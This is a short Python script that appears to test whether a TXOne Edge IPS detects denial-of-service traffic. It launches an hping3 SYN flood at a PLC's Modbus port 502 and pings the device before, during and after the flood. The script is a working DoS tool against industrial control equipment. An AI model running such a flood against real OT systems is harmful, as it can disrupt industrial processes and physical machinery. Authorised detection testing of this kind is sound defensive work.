import subprocess
import time
import os
import signal
import sys

def log(msg):
    print(f"[+] {msg}")

def ping_device(plc_ip, count=4):
    try:
        result = subprocess.run(["ping", "-c", str(count), plc_ip],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            log("Ping successful. OT device is responsive.")
        else:
            log("Ping failed or partially successful. Possible disruption.")
        print(result.stdout)
    except Exception as e:
        log(f"Error pinging device: {e}")

def launch_dos_attack(plc_ip):
    log(f"Launching SYN flood attack to {plc_ip} on port 502...")
    attack_cmd = ["hping3", "-S", plc_ip, "-p", "502", "--flood"]
    process = subprocess.Popen(attack_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
    return process

def stop_dos_attack(process):
    log("Stopping DoS attack...")
    os.killpg(os.getpgid(process.pid), signal.SIGTERM)

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 test-dos-detection.py <PLC-IP> <Duration-in-seconds>")
        sys.exit(1)

    plc_ip = sys.argv[1]
    try:
        attack_duration = int(sys.argv[2])
    except ValueError:
        print("Error: Duration must be an integer (seconds).")
        sys.exit(1)

    log("== TXOne Edge IPS DoS Detection Test ==")

    log("Step 1: Baseline connectivity check")
    ping_device(plc_ip)

    log("Step 2: Start DoS attack")
    attack_process = launch_dos_attack(plc_ip)
    time.sleep(attack_duration)

    log("Step 3: Check OT device status during attack")
    ping_device(plc_ip)

    stop_dos_attack(attack_process)
    time.sleep(5)

    log("Step 4: Check OT device status after attack")
    ping_device(plc_ip)

    log("== End of Test ==")
    log("Please check the IPS dashboard for alerts, blocked IPs, and logs.")

if __name__ == "__main__":
    main()
